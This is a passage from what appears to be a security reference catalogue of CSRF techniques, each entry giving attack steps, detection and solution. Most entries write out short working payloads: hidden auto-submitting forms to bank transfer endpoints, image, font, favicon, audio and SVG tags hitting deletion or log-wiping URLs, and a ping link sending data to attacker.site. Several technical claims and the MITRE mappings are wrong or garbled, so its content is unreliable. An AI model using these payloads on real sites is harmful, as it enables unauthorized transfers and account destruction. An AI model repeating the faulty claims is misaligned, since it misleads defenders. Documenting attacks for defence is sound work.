- **Attack Steps**: 1. The attacker creates an invisible iframe that loads a malicious form pointing to https://bank.com/transfer. 2. Inside the iframe, the form includes pre-filled values (e.g., recipient and amount) and a small JavaScript block: window.onload = function() { document.forms[0].submit(); }. 3. When a logged-in user visits the attacker’s page, the iframe loads, and the form automatically submits. 4. The browser attaches the user's session cookie to the POST request. 5. The bank server receives what appears to be a legitimate money transfer from the logged-in user. 6. Since the iframe is hidden using style="display:none", users don’t see the transfer form. 7. This method bypasses user interaction checks by chaining HTML and JS. 8. If the target site lacks CSRF tokens or origin checks, this results in unauthorized transfers.
- **Detection**: Validate form POSTs with tokens and origin headers
- **Solution**: Block third-party form submissions without confirmation
- **Tags**: #iframecsrf #bankingabuse #invisibledom

## CSRF via JSONP Callback Hijacking

- **Attack Type**: JavaScript-Based API Calls
- **Target**: APIs with legacy JSONP support
- **Vulnerability**: Unrestricted JSONP callback names
- **MITRE**: T1530
- **Impact**: Data theft via JS script injection
- **Tools**: JSONP, JavaScript
- **Scenario**: Exploits JSONP endpoint to perform credentialed GET calls
- **Attack Steps**: 1. An attacker identifies a site using https://api.site.com/getUser?callback=myFunc for JSONP requests. 2. They create a page that embeds a script tag: <script src="https://api.site.com/getUser?callback=evilFunc"></script>. 3. When a logged-in user visits the attack page, their session cookie is attached to the request. 4. The attacker defines a malicious evilFunc() in JS to hijack the returned data. 5. The browser treats it as a valid script, executing the attacker's callback. 6. Sensitive information like profile or payment info is exfiltrated. 7. Because JSONP is cross-domain by design, it allows exploitation from attacker sites. 8. JSONP endpoints should never return sensitive data or accept arbitrary callbacks.
- **Detection**: Inspect requests with cross-site referrers
- **Solution**: Deprecate JSONP in favor of CORS with tokens
- **Tags**: #jsonpcsrf #callbackabuse #apihijack

## CSRF via HTML Meta Refresh Redirect

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Admin or user settings panels
- **Vulnerability**: Destructive actions via GET
- **MITRE**: T1530
- **Impact**: Account deletion or reset
- **Tools**: HTML, Meta Tag
- **Scenario**: Meta tag redirects to a CSRF URL without user action
- **Attack Steps**: 1. A malicious page contains <meta http-equiv="refresh" content="0; url=https://portal.com/deleteAccount">. 2. When a user visits the page, the browser instantly redirects to the CSRF target. 3. If the user is authenticated with the site (e.g., portal.com), cookies are sent with the redirected GET request. 4. The endpoint performs a destructive action such as deleting an account or resetting data. 5. Because the redirect is client-side, browser logs show the request as user-initiated. 6. There’s no interaction required from the victim, and the page never renders any UI. 7. The attacker can even chain redirects to disguise the origin. 8. Mitigations include requiring POST for all critical actions and avoiding unsafe GET routes.
- **Detection**: Detect unexpected GET actions with no referrer
- **Solution**: Enforce POST + CSRF token and confirmation UI
- **Tags**: #metaredirect #htmlcsrf #redirectcsrf

## CSRF via Cross-Origin Font Loading

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Web apps loading external fonts
- **Vulnerability**: Insecure GET endpoints tied to resource fetch
- **MITRE**: T1530
- **Impact**: Hidden state changes
- **Tools**: CSS, @font-face
- **Scenario**: Loads font via CSS from target domain that executes action
- **Attack Steps**: 1. An attacker sets up a malicious CSS rule like: @font-face { font-family: EvilFont; src: url("https://app.com/trigger?banUser=123"); }. 2. When a victim visits the attack site, their browser attempts to download the font file. 3. The request goes to the target application and includes the victim’s cookies. 4. If the GET request is not protected and performs a state change, it executes silently. 5. The font is not actually rendered since the attacker may assign it to an invisible element. 6. This abuse of @font-face demonstrates how unexpected vectors like CSS can be used for CSRF. 7. Security teams often overlook font-based GET requests during audits. 8. The risk is amplified on sites that use GET for admin or destructive operations.
- **Detection**: Monitor font requests from untrusted sources
- **Solution**: Enforce token and restrict GET for state-changing actions
- **Tags**: #fontcsrf #cssabuse #stealthget

## CSRF via Fake Login Modal Over UI

- **Attack Type**: Single Origin Session Misuse
- **Target**: UIs with iframe embedding allowed
- **Vulnerability**: Weak visual anti-clickjacking
- **MITRE**: T1189
- **Impact**: Account modification via UI fraud
- **Tools**: CSS Z-Index, iframe
- **Scenario**: Clickjack a fake login modal on top of a sensitive site
- **Attack Steps**: 1. An attacker creates a page that loads https://site.com/profile inside an iframe. 2. On top of the iframe, a transparent fake login form is overlaid using z-index CSS tricks. 3. The user believes they’re entering their credentials to a normal login page, but actually interacts with the iframe underneath. 4. A click on the “Login” button triggers unintended actions like "Delete Profile". 5. This is a hybrid clickjacking + CSRF method that exploits visual misdirection. 6. Attackers can automate this with a pre-timed overlay that matches actual buttons. 7. Victims remain unaware unless they carefully inspect the page elements. 8. Modern sites can defend with X-Frame-Options and UI isolation.
- **Detection**: Enforce click integrity checks, framebusting
- **Solution**: Use frame guards and UI detection overlays
- **Tags**: #clickcsrf #uiredress #zindexattack

## CSRF via Browser Prefetch Header Abuse

- **Attack Type**: JavaScript-Based API Calls
- **Target**: SaaS dashboards or billing apps
- **Vulnerability**: Misused prefetch requests
- **MITRE**: T1530
- **Impact**: Billing abuse, quota change
- **Tools**: HTML Link Header
- **Scenario**: Uses link rel=prefetch to load a CSRF URL in advance
- **Attack Steps**: 1. The attacker includes in their page: <link rel="prefetch" href="https://target.com/autoRenew?years=5">. 2. Browsers interpret this as a performance enhancement and prefetch the resource. 3. If the user is authenticated, the browser includes cookies in the background GET request. 4. The target server executes the auto-renew logic, extending the plan or triggering billing. 5. The user sees nothing, and the URL is never shown in the address bar. 6. This uses browser optimization headers for malicious intent. 7. The trick is most effective when sites use GET for operations that should be POST-only. 8. Proper input validation and CSRF tokens prevent such abuses.
- **Detection**: Inspect prefetch logs and trigger headers
- **Solution**: Limit prefetch to safe idempotent operations
- **Tags**: #prefetchcsrf #headerabuse #silentcsrf

## CSRF via Drag-and-Drop File Upload

- **Attack Type**: JavaScript-Based API Calls
- **Target**: File upload forms or KYC portals
- **Vulnerability**: No CSRF validation on upload APIs
- **MITRE**: T1530
- **Impact**: Document spoofing, forced uploads
- **Tools**: HTML5 Drag API
- **Scenario**: Dragging a file onto a dropzone triggers unintended backend calls
- **Attack Steps**: 1. An attacker convinces a user to drag a file or image onto a specific drop area. 2. The dropzone is an iframe or div pointing to https://site.com/uploadProof?user=attacker. 3. The upload happens immediately on drop due to JavaScript listening for drop event and invoking fetch() or form.submit(). 4. The user thinks it’s just an innocent interaction with a UI element. 5. The backend accepts the uploaded file and attaches it to the attacker’s profile. 6. The attack works if drop-based APIs lack CSRF validation or token verification. 7. It’s effective in internal apps with relaxed upload rules. 8. This method abuses user intuition to initiate cross-site action.
- **Detection**: Validate drag origin and enforce tokens
- **Solution**: Sanitize file inputs and track referrer
- **Tags**: #dropcsrf #uploadhijack #html5abuse

## CSRF via <link rel="stylesheet"> Tag

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Style-capable endpoints
- **Vulnerability**: GET endpoint performing actions
- **MITRE**: T1530
- **Impact**: Lockout or access abuse
- **Tools**: CSS, HTML
- **Scenario**: Loads a stylesheet from a target domain to trigger state change
- **Attack Steps**: 1. The attacker embeds a <link rel="stylesheet" href="https://api.site.com/lockAccount?user=123">. 2. When the browser tries to apply the stylesheet, it sends a GET request to the target server. 3. If that endpoint accepts GET and performs critical actions, the user is unknowingly affected. 4. The CSS may not even be valid and may not render, but the request still reaches the server. 5. This stealth technique bypasses many script-blocking WAFs since it’s pure HTML. 6. GET-based state-changing endpoints are especially vulnerable. 7. Mitigation is straightforward: never allow GET to change data. 8. Monitor requests coming from rel="stylesheet" with sensitive paths.
- **Detection**: Monitor style link loads to APIs
- **Solution**: Block all GET for non-idempotent changes
- **Tags**: #linkcsrf #stylesheetabuse #hiddenGET

## CSRF via Form Action Hijack in Bookmarklet

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Any authenticated form-based UI
- **Vulnerability**: Trust in form action without validation
- **MITRE**: T1530
- **Impact**: Destructive session hijack
- **Tools**: JS Bookmarklet
- **Scenario**: Bookmarklet alters a form’s action to a CSRF endpoint
- **Attack Steps**: 1. A malicious bookmarklet is promoted to users as a “helper” tool for speeding up actions. 2. It contains JS like document.forms[0].action="https://target.com/deleteAccount";document.forms[0].submit();. 3. The user runs this while browsing their actual account dashboard. 4. The form on the current page (intended for a different use) is hijacked to perform a destructive CSRF action. 5. The server accepts the POST request with cookies and executes it. 6. Since bookmarklets execute in page context, there are no browser warnings. 7. This attack abuses user trust and browser permissions. 8. Defenses include validating origin and token for every sensitive form action.
- **Detection**: Prevent JS-modified forms from submitting unchecked
- **Solution**: Audit bookmarklet usage on sensitive apps
- **Tags**: #bookmarkcsrf #actionhijack #clientformcsrf

## CSRF via Image Load in Hidden Email Signature

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Webmail users with shared login sessions
- **Vulnerability**: GET actions tied to image requests
- **MITRE**: T1530
- **Impact**: Preference tampering
- **Tools**: HTML Email, <img>
- **Scenario**: Invisible image triggers GET request from webmail client
- **Attack Steps**: 1. The attacker crafts an HTML email with a hidden <img> tag pointing to https://portal.com/disableNotifications. 2. The tag is styled as display:none or sized to 1x1 pixels to be invisible. 3. When the victim opens the email in their webmail (e.g., Gmail), the browser automatically loads the image. 4. Since most webmail clients use browser context and the victim is likely logged into the portal site, their session cookies are included in the request. 5. The action completes silently, disabling user notifications or preferences. 6. No script is needed — just passive HTML rendering. 7. This bypasses many traditional CSRF protections that only monitor form or JS usage. 8. It shows how emails can be weaponized for cross-origin GET-based CSRF.
- **Detection**: Log referrer from email clients
- **Solution**: Block GET-based critical actions and image abuse
- **Tags**: #emailcsrf #imgsrcattack #invisiblecsrf

## CSRF via JavaScript Blob Download Trigger

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Cloud storage portals or dashboards
- **Vulnerability**: GET downloads for sensitive data
- **MITRE**: T1530
- **Impact**: Silent exfiltration of personal data
- **Tools**: Blob API, JavaScript
- **Scenario**: Auto-triggers sensitive download API call using Blob and anchor click
- **Attack Steps**: 1. A malicious page generates a Blob URL linked to a GET request like https://files.app.com/exportAllData. 2. The attacker uses JS to simulate a click on an <a> tag with download attribute pointing to the Blob. 3. When the user visits the page while authenticated, the session cookie is attached, and the server processes the export. 4. The user ends up unknowingly downloading their entire account data to the attacker’s site or logs. 5. It exploits user permissions and trusted download behavior. 6. No visible interface or interaction is required. 7. Advanced attacks even encode downloaded blobs and transmit them back silently. 8. Sensitive exports must always require explicit confirmation or token validation.
- **Detection**: Monitor unusual download spikes
- **Solution**: Require re-auth or tokens before download
- **Tags**: #blobcsrf #downloadcsrf #dataexfil

## CSRF via Cross-Origin Audio Autoplay

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Social apps or user management
- **Vulnerability**: GET endpoint without CSRF token
- **MITRE**: T1530
- **Impact**: Silent friend deletion or demotion
- **Tools**: HTML <audio> Tag
- **Scenario**: Audio tag fetches remote URL to trigger GET request
- **Attack Steps**: 1. An attacker embeds <audio src="https://profile.com/removeFriend?id=123" autoplay style="display:none;"></audio> into their malicious page. 2. Once a logged-in victim visits the page, the browser tries to play the audio by downloading the remote file. 3. The GET request hits the target server with cookies intact. 4. If the server doesn’t protect the endpoint, it performs the delete action. 5. Because no media is played or seen, the attack goes unnoticed. 6. It demonstrates how benign tags like <audio> can be hijacked to carry CSRF payloads. 7. Combined with style tricks, the attack becomes completely invisible to users. 8. Best practices should avoid using GET for anything destructive or session-altering.
- **Detection**: Review media GET logs with unusual paths
- **Solution**: Only allow POST for account-changing actions
- **Tags**: #audiocsrf #stealthattack #autoplaycsrf

## CSRF via window.name Persistence Hack

- **Attack Type**: Single Origin Session Misuse
- **Target**: Any tab-based app or dashboard
- **Vulnerability**: Persistent window.name data
- **MITRE**: T1136
- **Impact**: Replay-based CSRF attacks
- **Tools**: JS, window.name
- **Scenario**: Persist data in window.name to trigger future CSRF
- **Attack Steps**: 1. An attacker opens a new window with window.open("https://app.com", "csrfWindow"). 2. They set csrfWindow.name = "triggerCSRF=https://app.com/deleteAll". 3. On future visits, the victim unknowingly reopens the same-named window. 4. The page auto-reads the window.name, and attacker-injected JS navigates to the destructive URL. 5. Since this navigation is initiated from within a legitimate window, browser protections are bypassed. 6. Cookies are sent as usual, and the CSRF action completes. 7. This method abuses an often overlooked storage mechanism that persists across sessions and origins. 8. Mitigation includes sanitizing window.name or clearing it on sensitive pages.
- **Detection**: Strip or sanitize window.name on load
- **Solution**: Do not trust client-provided JS window state
- **Tags**: #windowname #replaycsrf #tabcsrf

## CSRF via GET Request in SVG File

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Web apps rendering SVG uploads
- **Vulnerability**: GET endpoints with sensitive impact
- **MITRE**: T1530
- **Impact**: Silent logout or profile damage
- **Tools**: SVG File
- **Scenario**: Embeds a CSRF GET inside an SVG animation URL
- **Attack Steps**: 1. The attacker uploads an SVG image with an embedded <image> tag: <image xlink:href="https://secure.site.com/logOutUser" height="0" width="0"/>. 2. When the image is rendered (e.g., in a profile page), the browser automatically sends the request. 3. Since SVG is parsed as XML and rendered like HTML, GET requests to remote servers execute silently. 4. The logout or delete action completes if no protection is in place. 5. SVGs can be delivered via email, chat apps, or file upload features. 6. They often evade WAF filters since they're not traditional HTML. 7. Even some antivirus tools treat SVGs as safe media. 8. This makes SVG a stealthy CSRF delivery vector.
- **Detection**: Sanitize SVG files on upload/render
- **Solution**: Disable state changes on GET requests
- **Tags**: #svgcsrf #vectorabuse #logoutexploit

## CSRF via Shadow DOM Injection

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Finance platforms with DOM interaction
- **Vulnerability**: Blind trust on request source
- **MITRE**: T1530
- **Impact**: Fund transfer or data manipulation
- **Tools**: Shadow DOM, JS
- **Scenario**: Injects shadow-root form that submits without visibility
- **Attack Steps**: 1. A malicious page uses JavaScript to create a shadow root and injects a form inside it. 2. The form is constructed with action to https://bank.com/transferFunds. 3. Inside the shadow root, JS sets values and submits the form using .submit(). 4. Since Shadow DOM elements are hidden from normal DOM inspection, user is unaware. 5. Browser still attaches session cookies to the outgoing request. 6. The bank processes the action, believing it to be user-initiated. 7. Shadow DOM bypasses some traditional CSRF detection that relies on visible DOM manipulation. 8. Secure apps should validate all actions server-side regardless of DOM visibility.
- **Detection**: Detect hidden form activity
- **Solution**: Enforce server-side CSRF token checks
- **Tags**: #shadowcsrf #domabuse #hiddenform

## CSRF via Popup Login Abuse

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Dashboard panels or OAuth UIs
- **Vulnerability**: Unvalidated postMessage handling
- **MITRE**: T1136
- **Impact**: Credential update or account change
- **Tools**: JS Popup Window
- **Scenario**: Opens legit site in popup, but uses it to send CSRF payload
- **Attack Steps**: 1. Attacker opens a popup window of https://portal.com/dashboard. 2. From the parent page, they access the popup’s window and call window.postMessage with a payload that includes form data. 3. If the dashboard listens for postMessages, it may auto-submit the received data. 4. The popup is small or minimized, and user doesn’t notice. 5. The dashboard receives the message and completes an unintended action like updating credentials. 6. This method is used in social engineering where user thinks they’re logging into something else. 7. The real action happens in the popup context. 8. Cross-window communication must be tightly scoped and validated.
- **Detection**: Validate message origin and intent
- **Solution**: Reject external messages without user interaction
- **Tags**: #popupcsrf #postmessageattack #loginhijack

## CSRF via Invisible Drag-to-Confirm Trick

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Any app with custom drag UIs
- **Vulnerability**: No validation on drag-triggered APIs
- **MITRE**: T1530
- **Impact**: Tricked user action, false confirmations
- **Tools**: HTML5 Drag API
- **Scenario**: User unknowingly drags mouse over a hidden dropzone
- **Attack Steps**: 1. A deceptive webpage includes a transparent element set to accept file or mouse drag. 2. On drag, it triggers an API fetch like https://site.com/triggerFlag. 3. The attacker overlays this on top of normal-looking content like a fake CAPTCHA. 4. When a user tries to drag a slider or solve a CAPTCHA, the action completes a CSRF call. 5. It’s disguised as user interaction but not what the user expects. 6. This method blurs the line between social engineering and pure CSRF. 7. Browsers trust drag-and-drop behavior unless restricted. 8. Sites must verify action source via headers or user prompts.
- **Detection**: Log unusual drag events triggering APIs
- **Solution**: Require token/auth for all sensitive triggers
- **Tags**: #dragcsrf #visualtrick #mouseabuse

## CSRF via Link Click from Favicon

- **Attack Type**: CSRF with GET Forms & Auto Image Loads
- **Target**: Admin panels, logging endpoints
- **Vulnerability**: Unsafe GET logic behind favicon
- **MITRE**: T1530
- **Impact**: Silent log wiping or resets
- **Tools**: HTML <link>
- **Scenario**: Hidden <link rel="icon"> points to sensitive endpoint
- **Attack Steps**: 1. A <link rel="icon" href="https://secure.com/clearLogs"> is included in attacker’s site. 2. When a user visits the page, the browser tries to fetch the favicon. 3. The GET request includes cookies if the user is logged in to secure.com. 4. If the endpoint clears logs or resets something, the action succeeds. 5. Favicons are fetched automatically and usually ignored by security filters. 6. This makes it a powerful passive CSRF trigger. 7. The favicon doesn't even need to exist — the fetch itself can trigger the logic. 8. Safe design means never exposing stateful logic on GET URLs.
- **Detection**: Monitor favicon requests to sensitive paths
- **Solution**: Require POST/token for state change
- **Tags**: #faviconcsrf #logwipe #stealthGET

## CSRF via ping Attribute in Anchor Tag

- **Attack Type**: JavaScript-Based API Calls
- **Target**: Sites that handle user events via ping
- **Vulnerability**: Implicit trust on browser pings
- **MITRE**: T1530
- **Impact**: Hidden POST triggering tracking or changes
- **Tools**: HTML5 Ping Attribute
- **Scenario**: <a ping="..."> sends background POST after link click
- **Attack Steps**: 1. A malicious site includes a link like <a href="https://safe.site.com" ping="https://attacker.site/notify?user=123">Click Here</a>. 2. When the user clicks the link, the browser sends a POST to the ping URL. 3. This POST includes data such as the destination and potentially session cookies. 4. The attacker uses it to signal or trigger secondary actions. 5. The user thinks they just clicked a regular link. 6. Ping attributes can be abused for user tracking or hidden notifications. 7. Servers receiving ping requests must validate their intent and origin. 8. Browser vendors are aware, but defenses must be enforced on the server too.
- **Detection**: Inspect ping headers and referrers
- **Solution**: Block ping-based POSTs to critical APIs
- **Tags**: #pingcsrf #clicktrack #html5hack

